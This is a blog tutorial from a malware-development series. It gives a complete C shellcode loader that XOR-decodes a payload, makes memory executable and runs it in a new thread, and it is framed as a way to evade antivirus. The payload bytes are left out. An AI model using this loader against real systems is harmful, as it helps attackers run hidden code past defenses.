<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Local Payload Execution - pwn3rx0</title>
  <meta name="description" content="A technical guide on executing binary payloads directly in a local process's memory space using VirtualAlloc, VirtualProtect, and CreateThread.">
  <meta name="keywords" content="malware-development, shellcode, evasion, win-api, memory-management, cybersecurity, security, writeups, ctf, pentest, penetration testing, red team, red teaming, malware, malware development, windows internals, windows api, payload, injection, active directory, ad, ad enumeration, kerberoasting, lateral movement, post exploitation, defense evasion, opsec, privilege escalation, blue team, incident response, andrew mamdouh, pwn3rx0, andrew_mamdouh, malware dev, execution">
  <meta name="author" content="Andrew Mamdouh (pwn3rx0)">
  <link rel="canonical" href="/writeups/Malware DEV/Execution/Local Payload Execution.html">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta property="og:title" content="Local Payload Execution">
  <meta property="og:description" content="A technical guide on executing binary payloads directly in a local process's memory space using VirtualAlloc, VirtualProtect, and CreateThread.">
  <meta property="og:type" content="article">
  <meta property="og:site_name" content="pwn3rx0 blog">
  <meta property="og:image" content="/assets/images/og-home.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="/writeups/Malware DEV/Execution/Local Payload Execution.html">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Local Payload Execution">
  <meta name="twitter:description" content="A technical guide on executing binary payloads directly in a local process's memory space using VirtualAlloc, VirtualProtect, and CreateThread.">
  <meta name="twitter:image" content="/assets/images/og-home.png">
  <meta name="site-base" content="/">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/github-dark.min.css">
  <link rel="icon" href="/assets/icons/favicon.svg" type="image/svg+xml">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon" sizes="any">
</head>
<body>
  <div class="app-container">
    <aside class="sidebar">
      <div class="profile-card">
        <div class="avatar">
          <img src="/assets/images/profile.jpg" alt="Andrew Mamdouh">
        </div>
        <div class="profile-name">Andrew Mamdouh</div>
        <div class="profile-nick" style="color:#8a8f98;">(pwn3rx0)</div>
        <nav class="social-tabs">
          <a class="chip" href="https://github.com/pwn3rx0">GitHub</a>
          <a class="chip" href="https://www.linkedin.com/in/andrew-mamdouh122">LinkedIn</a>
          <a class="chip" href="https://x.com/pwn3rx0">X</a>
        </nav>
      </div>
      <nav class="category-tree"></nav>
    </aside>
    <main class="main-content">
      <nav class="breadcrumbs">
      
      <a href="/">Home</a>
    
      <span class="separator">/</span>
      <a href="/category/Malware DEV.html">Malware DEV</a>
    
      <span class="separator">/</span>
      <a href="/category/Malware DEV/Execution.html">Execution</a>
    
      <span class="separator">/</span>
      <span class="current">Local Payload Execution</span>
    </nav>
      <article class="writeup">
        <header>
          <h1>Local Payload Execution</h1>
          <div class="writeup-meta">
            <div class="writeup-date">date: <time datetime="February 24, 2026 at 02:00 AM">February 24, 2026 at 02:00 AM</time></div>
            <div class="tags-row">
              <div class="tags-label">tags:</div>
              <div class="tags"><span class="tag">malware-development</span><span class="tag">shellcode</span><span class="tag">evasion</span><span class="tag">win-api</span><span class="tag">memory-management</span></div>
            </div>
            
          </div>
        </header>
        <div class="writeup-content"><p>is a technique used to run a binary payload (often shellcode) directly within the memory space of a process on a local machine. This method is common in offensive security for executing code without writing it to disk, reducing the chance of detection by antivirus or endpoint protection solutions.</p>
<hr>
<h2>Code Example: Local Payload Execution in C</h2>
<pre><code class="language-c">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

// Function to decode or prepare shellcode (details abstracted here)
BOOL XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i &lt; sShellcodeSize; i++, j++) {
        if (j &gt;= sKeySize) {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
    return TRUE;
}

unsigned char XorKey[] = { /* key bytes */ };

int main() {
    unsigned char cipherText[] = { /* encrypted payload bytes */ };
    SIZE_T sDSize = sizeof(cipherText);

    // Step 1: Decode payload
    if (!XorByInputKey(cipherText, sDSize, XorKey, sizeof(XorKey))) {
        return -1;
    }

    // Step 2: Allocate memory for payload
    PVOID pShellCodeAddres = VirtualAlloc(NULL, sDSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pShellCodeAddres) {
        return -1;
    }

    // Step 3: Copy payload to allocated memory
    memcpy(pShellCodeAddres, cipherText, sDSize);
    memset(cipherText, &#39;\0&#39;, sDSize);  // Clear original buffer

    // Change memory protection to executable
    DWORD dwOldProtect = 0;
    if (!VirtualProtect(pShellCodeAddres, sDSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect)) {
        VirtualFree(pShellCodeAddres, 0, MEM_RELEASE);
        return -1;
    }

    // Step 4: Execute payload in a new thread
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellCodeAddres, NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(pShellCodeAddres, 0, MEM_RELEASE);
        return -1;
    }

    // Wait for payload execution to finish
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // Step 5: Free allocated memory
    VirtualFree(pShellCodeAddres, 0, MEM_RELEASE);

    return 0;
}
</code></pre>
<h2>Key Steps in Local Payload Execution</h2>
<h3>1. Preparation of Payload</h3>
<ul>
<li>The payload is stored in memory, often in an encoded or obfuscated form.</li>
<li>It must be decoded or decrypted in-memory before execution (this step is necessary but secondary to execution itself).</li>
</ul>
<h3>2. Memory Allocation</h3>
<ul>
<li>The Windows API function <code>VirtualAlloc</code> is used to allocate memory with specific flags.<ul>
<li><code>MEM_COMMIT | MEM_RESERVE</code>: Reserves and commits memory.</li>
<li><code>PAGE_READWRITE</code>: Allows the memory to be written to initially.</li>
</ul>
</li>
<li>The allocated memory must be large enough to hold the entire payload.</li>
</ul>
<h3>3. Copying Payload to Executable Memory</h3>
<ul>
<li>The decoded payload is copied into the allocated memory.</li>
<li>After copying, the memory protection is changed using <code>VirtualProtect</code> to:<ul>
<li><code>PAGE_EXECUTE_READWRITE</code>: Allows the payload to be executed from this memory region.</li>
</ul>
</li>
<li>Changing memory permissions is crucial since many systems mark writable memory as non-executable by default to prevent code injection attacks.</li>
</ul>
<h3>4. Executing the Payload</h3>
<ul>
<li>A new thread is created using <code>CreateThread</code>, with the starting routine set to the address of the allocated memory containing the payload.</li>
<li>This allows the payload to run asynchronously within the same process.</li>
<li>The main thread waits for the payload thread to finish execution using <code>WaitForSingleObject</code>.</li>
</ul>
<h3>5. Cleanup</h3>
<ul>
<li>After execution, allocated memory is freed using <code>VirtualFree</code>.</li>
<li>Sensitive data buffers are cleared (e.g., zeroing the payload buffer) to minimize traces in memory.</li>
</ul>
<hr>
</div>
        <nav class="post-navigation">
          
      <a href="/writeups/Malware DEV/Execution/Local Dll Execution.html" class="nav-link prev-post">
        <span class="nav-direction">← Previous</span>
        <span class="nav-title">Local DLL Execution</span>
      </a>
    
          
      <a href="/writeups/Malware DEV/Execution/Remote Dll injection.html" class="nav-link next-post">
        <span class="nav-direction">Next →</span>
        <span class="nav-title">Remote DLL Injection</span>
      </a>
    
        </nav>
        
      <aside class="related-posts">
        <h3>Related Writeups</h3>
        <ul class="related-list">
          <li><a href="/writeups/Malware DEV/Obfuscation/To IPs.html">IPv4 Masquerading (Obfuscation)</a></li><li><a href="/writeups/Malware DEV/Payload Placement/Staged/HTTP Stageing.html">HTTP Stager & Remote Payload Delivery</a></li><li><a href="/writeups/Malware DEV/Encryption/Encryption.html">Shellcode Obfuscation & Encryption</a></li>
        </ul>
      </aside>
    
      </article>
    </main>
  </div>
  <button class="mobile-menu-toggle">☰</button>
  <script src="/assets/js/main.js"></script>
  <script src="/assets/js/navigation.js"></script>
  <script>
    window.MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']],
        displayMath: [['$$','$$'], ['\\[','\\]']]
      },
      svg: { fontCache: 'global' }
    };
  </script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js" defer></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/c.min.js" defer></script>
  <script>
    (function() {
      function enhanceCodeBlocks(scope) {
        const container = scope || document.querySelector('.writeup-content') || document;
        const blocks = Array.from(container.querySelectorAll('pre > code')).filter(c => !c.closest('.code-block'));
        blocks.forEach(code => {
          const pre = code.parentElement;
          if (!pre || pre.dataset.enhanced === 'true') return;
          pre.dataset.enhanced = 'true';
          let langClass = Array.from(code.classList || []).find(c => c.startsWith('language-'));
          if (!langClass) {
            const t = code.textContent || '';
            if (/#include\s+<[^>]+>/.test(t) || /\bint\s+main\s*\(/.test(t) || /#include\s+<Windows\.h>/i.test(t)) {
              code.classList.add('language-c');
              langClass = 'language-c';
            }
          }
          const lang = (langClass ? langClass.replace('language-', '') : 'text').toUpperCase();
          const wrapper = document.createElement('div');
          wrapper.className = 'code-block';
          const header = document.createElement('div');
          header.className = 'code-header';
          const langEl = document.createElement('span');
          langEl.className = 'code-lang';
          langEl.textContent = lang;
          const btn = document.createElement('button');
          btn.className = 'code-copy';
          btn.type = 'button';
          btn.textContent = 'Copy';
          btn.addEventListener('click', async () => {
            const text = code.innerText;
            const fallbackCopy = () => {
              const ta = document.createElement('textarea');
              ta.value = text;
              ta.style.position = 'fixed';
              ta.style.opacity = '0';
              ta.style.left = '-9999px';
              document.body.appendChild(ta);
              ta.focus();
              ta.select();
              try {
                document.execCommand('copy');
                btn.textContent = 'Copied';
              } catch (_) {
                btn.textContent = 'Failed';
              } finally {
                document.body.removeChild(ta);
                setTimeout(() => (btn.textContent = 'Copy'), 1200);
              }
            };
            try {
              if (navigator.clipboard && window.isSecureContext) {
                await navigator.clipboard.writeText(text);
                btn.textContent = 'Copied';
                setTimeout(() => (btn.textContent = 'Copy'), 1200);
              } else {
                fallbackCopy();
              }
            } catch (_) {
              fallbackCopy();
            }
          });
          header.appendChild(langEl);
          header.appendChild(btn);
          const holder = document.createElement('div');
          holder.className = 'code-content';
          pre.replaceWith(wrapper);
          holder.appendChild(pre);
          wrapper.appendChild(header);
          wrapper.appendChild(holder);
          if (window.hljs && typeof window.hljs.highlightElement === 'function') {
            window.hljs.highlightElement(code);
          } else if (window.hljs && typeof window.hljs.highlightAll === 'function') {
            window.hljs.highlightAll();
          }
        });
      }
      function indentAfterHeadings(scope) {
        const container = scope || document.querySelector('.writeup-content');
        if (!container) return;
        const headings = container.querySelectorAll('h1,h2,h3,h4,h5,h6');
        headings.forEach(h => {
          const level = parseInt(h.tagName.substring(1), 10);
          let el = h.nextElementSibling;
          while (el) {
            if (/^H[1-6]$/.test(el.tagName)) {
              const nextLevel = parseInt(el.tagName.substring(1), 10);
              if (nextLevel <= level) break;
            }
            if (el.tagName === 'P') {
              el.classList.add('indent-p');
            }
            el = el.nextElementSibling;
          }
        });
      }
      function initEnhancements() {
        if (window.mermaid) {
          mermaid.initialize({ startOnLoad: true, theme: 'dark' });
        }
        enhanceCodeBlocks();
        indentAfterHeadings();
        if (window.hljs && typeof window.hljs.highlightAll === 'function') {
          window.hljs.highlightAll();
        }
        const target = document.querySelector('.writeup-content');
        if (target && window.MutationObserver) {
          const mo = new MutationObserver(() => {
            enhanceCodeBlocks(target);
            indentAfterHeadings(target);
            if (window.hljs && typeof window.hljs.highlightAll === 'function') {
              window.hljs.highlightAll();
            }
          });
          mo.observe(target, { childList: true, subtree: true });
        }
      }
      window.addEventListener('load', initEnhancements);
    })();
  </script>
</body>
</html>
